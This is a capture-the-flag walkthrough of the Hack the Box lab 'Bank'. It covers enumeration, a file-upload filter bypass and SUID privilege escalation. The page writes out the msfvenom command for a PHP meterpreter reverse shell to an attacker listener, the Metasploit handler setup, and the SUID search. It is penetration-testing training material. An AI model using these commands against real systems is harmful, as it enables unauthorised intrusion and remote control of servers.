<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/hackthebox/" rel="category tag">HackTheBox</a></span>            </div>
            <h1 class="post-title entry-title">Hack the Box Challenge: Bank Walkthrough</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/hack-the-box-challenge-bank-walkthrough/" rel="bookmark"><time class="entry-date published" datetime="2018-04-06T06:53:50+00:00">April 6, 2018</time><time class="updated" datetime="2025-07-06T17:38:06+00:00">July 6, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;">Hello friends!! Today we are going to solve another CTF challenge “<strong>Bank</strong>” which is categories as retired lab presented by <strong>Hack the Box</strong> for making online penetration practices. Solving challenges in this lab is not that much tough until you don’t have the correct knowledge of Penetration testing. Let start and learn how to breach a network then exploit it for retrieving desired information.</span></p>
<p><span style="color: #000000;"><strong>Level: </strong>Intermediate</span></p>
<p><span style="color: #000000;"><strong>Task:</strong> find <strong>user.txt</strong> and <strong>root.txt</strong> file on the victim’s machine.</span></p>
<h3><span style="color: #800000;">Initial Reconnaissance and Web Enumeration</span></h3>
<p><span style="color: #000000;">Since these labs are online accessible therefore they have static IP. The IP of Bank is <strong>10.10.10.29</strong> so let’s initiate with nmap port enumeration.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">nmap -A 10.10.10.29</pre>
<p><span style="color: #000000;">From given below image, you can observe we found ports 22, 53 and 80 are open in victim’s network. As you have seen in our all previous lab that we love to explore target IP via port 80 on our web browser, similarly we follow that tradition in this also but Bad Luck!! this time it didn’t work at all.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-uuNyBdvIJbY/WscUxR0Dd-I/AAAAAAAAWFU/-BAPWjnYTfA7eNwO3SjHg-cfYBWDNtDvACLcBGAs/s1600/1.png"/></span></p>
<p><span style="color: #000000;">Now the last option was to <strong>add target IP</strong> inside <strong>/etc/host </strong>file since port 53 was open for the domain and as it is a challenge of hack the box thus I edit <strong>bank.htb</strong> as a domain name.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-Yw8KExbkHdw/WscU0dpRn5I/AAAAAAAAWF0/VNBIEbTOv7Y9ZDbKYbcAIYWJTGTFeXK7QCLcBGAs/s1600/2.png"/></span></p>
<p><span style="color: #000000;">Then I explore the domain name: bank.htb through the web browser and found following login page as shown below.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-TNkuHArQY_s/WscU0zRD-aI/AAAAAAAAWF4/JabuQfMqH-UIfuEp1mmz2KD7GGRLhNSswCLcBGAs/s1600/3.png"/></span></p>
<h3><span style="color: #800000;">Bypassing Authentication and File Upload Exploitation</span></h3>
<p><span style="color: #000000;">Then I preferred to use dirbuster tool and chose <strong>directory list 2-3 medium.txt</strong> file for directory brute force attack on <strong>http://bank.htb</strong> for PHP file extension.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-NNjgeEowoIU/WscU056mOmI/AAAAAAAAWF8/H91vQyYzP2IF7D1YHIxU_boFoyk-cPzyACLcBGAs/s1600/4.png"/></span></p>
<p><span style="color: #000000;">Here I found so many directories but I was interested in <strong>the support.php</strong> file. So when I try to explore <strong>http://bank.htb/support.php</strong> I was unable to access this web page as I was always redirected to login page due to HTTP response 302.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-MKOIatXMgJ0/WscU0-OPhEI/AAAAAAAAWGA/Ssv94f5-WUkMGoEBQcj5a6M_wh9QxlxXwCLcBGAs/s1600/5.png"/></span></p>
<p><span style="color: #000000;">So I installed the<strong> noredirect</strong> plugin from firefox that allows me to stop any 302 redirections. I simply added http://bank.htb/login.php to the noredirect plugin so it can stop redirecting to /login.php consistently.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-tJ9UhhxhQMk/WscU1eL1uCI/AAAAAAAAWGE/Qb0H6ThUDFouGTGx7p2RQrqhVTzBBn6TwCLcBGAs/s1600/6.png"/></span></p>
<p><span style="color: #000000;">So now I’m able to access the exact support.php page where I saw an upload option for uploading a PHP file hence we can try to upload a PHP backdoor instead of a genuine PHP file.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-VRSlykQ96DI/WscU19cgVqI/AAAAAAAAWGM/H8O0MvAEBNkQeV_O04St05D0LjUnSV4BACLcBGAs/s1600/7.png"/></span></p>
<h3><span style="color: #800000;">Gaining Initial Foothold via PHP Backdoor</span></h3>
<p><span style="color: #000000;">Using msfvenom we had created a malicious shell.php file by executing following command.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">msfvenom -p php/meterpreter/reverse_tcp lhost=10.10.14.6 lport=4444 -f raw</pre>
<p><span style="color: #000000;">Simultaneously run multi/handler for reverse connection of the victim’s system.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-M8jxgqgdvjg/WscU1ivpEYI/AAAAAAAAWGI/bxVb_6Xxv9g-fWVxBNb5HiM2vH6BkZv5ACLcBGAs/s1600/8.png"/></span></p>
<p><span style="color: #000000;">Then with the title shell, I upload shell.php by adding “ignite” in the message box and click on submit. But failed to upload this file therefore without wasting time I simply intercept our browser HTTP request in Burpsuite.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-isQQiGrNQ_U/WscUxRsDUaI/AAAAAAAAWFQ/9HDOeWH6I0Ej2MVoiv6T8IR387Jq3FQGwCLcBGAs/s1600/10.png"/></span></p>
<p><span style="color: #000000;">From given below image you can observe that we had fetched intercepted HTTP request of the uploaded <strong>shell.php</strong> file.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-LnJFXKaCbzA/WscUxZmdN6I/AAAAAAAAWFM/UCFyiEoS8FQNKOYDScE77H8XhosFrsuRACLcBGAs/s1600/11.png"/></span></p>
<p><span style="color: #000000;">After so many attempts I simply <strong>modify shell.php </strong>into <strong>shell.htb</strong> and forward the intercepted data.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-HuqfOwzRKgI/WscUyEGtHbI/AAAAAAAAWFY/YB5yZet4ZO43PAW6-mNSzWEFrgXOl990QCLcBGAs/s1600/12.png"/></span></p>
<p><span style="color: #000000;">YES!! It successfully gets uploaded, then I run this file and move back to the Metasploit framework for the meterpreter session.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-6dBRE8JuOls/WscUyVutU0I/AAAAAAAAWFc/R_O66zVC-Yc3E_XmJPRSccoGtk5GRp5owCLcBGAs/s1600/14.png"/></span></p>
<p><span style="color: #000000;">After executing uploaded backdoor file come back to the Metasploit framework and wait for the meterpreter session.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">msf use exploit/multi/handler
msf exploit(multi/handler) set payload php/meterpreter/reverse_tcp
msf exploit(multi/handler) set lhost 10.10.14.6
msf exploit(multi/handler) set lport 4444
msf exploit(multi/handler) exploit</pre>
<p><span style="color: #000000;">From given below image you can observe <strong>meterpreter session1</strong> opened for accessing victim tty shell.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">meterpreter&gt;sysinfo</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-GuW5URV0gxA/WscUyXKxmeI/AAAAAAAAWFg/rWHQQKZUEl43FCnh8_YMDh6UnA4I9LihwCLcBGAs/s1600/15.png"/></span></p>
<p><span style="color: #000000;">Now let’s finish the task by grabbing user.txt and root.txt file. First I move into /home directory and check available files and directories inside it.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">cd /home
ls</pre>
<p><span style="color: #000000;">Here one directory chris, when I explore <strong>/home/chris </strong>I saw user.txt and use cat command for reading.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">cd chris
ls
cat user.txt</pre>
<p><span style="color: #000000;"><strong>Great!!</strong>  Here we had completed 1<sup>st</sup> task now move to 2<sup>nd</sup> tasK</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-fPA2spGQ0ew/WscUy1t4OGI/AAAAAAAAWFk/r2d2iHn11aMzYUdHWVS0L0nvEHVZFyh1QCLcBGAs/s1600/16.png"/></span></p>
<h3><span style="color: #800000;">Privilege Escalation Through SUID Binary</span></h3>
<p><span style="color: #000000;">Inside /var/www/bank/uploads directory I checkout root privileges directory by executing following command.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">find / -perm -4000 2&gt;/dev/null</pre>
<p><span style="color: #000000;">As result, it dumps so many directories have root privileges but I look at <strong>/var/htb/bin/emergency</strong>.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-QS8hV8OOQq0/WscUztbQwyI/AAAAAAAAWFo/85kXzw34uaccsVlQs2PG513c3mRFPfsqwCLcBGAs/s1600/17.png"/></span></p>
<p><span style="color: #000000;">When I extract all directory here I found an emergency file which I had run for getting root access as shown below in the image.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">./emergency
id</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-TxIQZMUK63M/WscU0Fp-chI/AAAAAAAAWFs/OXKY2sUgUnoq3gBpu70TJ5rYCMQvNd-9ACLcBGAs/s1600/18.png"/></span></p>
<p><span style="color: #000000;">Now let’s get the root.txt by executing the following command.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">cd /root
cat root.txt</pre>
<p><span style="color: #000000;">We have successfully completed 2<sup>nd</sup> task.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-GGHYXZWyQ2s/WscU0cZX6jI/AAAAAAAAWFw/ogYeFXrTxTgVxhb9C_UmnMahP9RCZD3AwCLcBGAs/s1600/19.png"/></span></p>
<p><span style="color: #000000;">Thank you for giving your precious time to read this walkthrough. If you want to read more HTB Write-ups. Follow this <strong><a style="color: #000000;" href="https://www.hackingarticles.in/category/ctf-challenges/hackthebox/">Link.</a></strong> Happy</span> Hacking!</p>
<p><span style="color: #000000;"><strong>Author: </strong>AArti Singh is a Researcher and Technical Writer at Hacking Articles an Information Security Consultant Social Media Lover and Gadgets. Contact<strong><a style="color: #000000;" href="https://www.linkedin.com/in/aarti--singh/"> here</a></strong></span></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
